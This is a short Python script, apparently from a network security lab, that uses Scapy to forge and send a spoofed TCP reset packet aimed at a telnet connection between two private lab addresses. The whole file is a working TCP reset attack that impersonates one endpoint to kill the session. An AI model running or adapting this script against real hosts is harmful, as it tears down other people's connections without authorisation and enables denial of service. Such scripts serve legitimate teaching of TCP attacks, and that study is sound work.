#!/usr/bin/env python3
from scapy.all import *

ip  = IP(src="10.9.0.6", dst="10.9.0.7")
tcp = TCP(sport=48652, dport=23, flags="R", seq=655087690)
pkt = ip/tcp
ls(pkt)
send(pkt, verbose=0)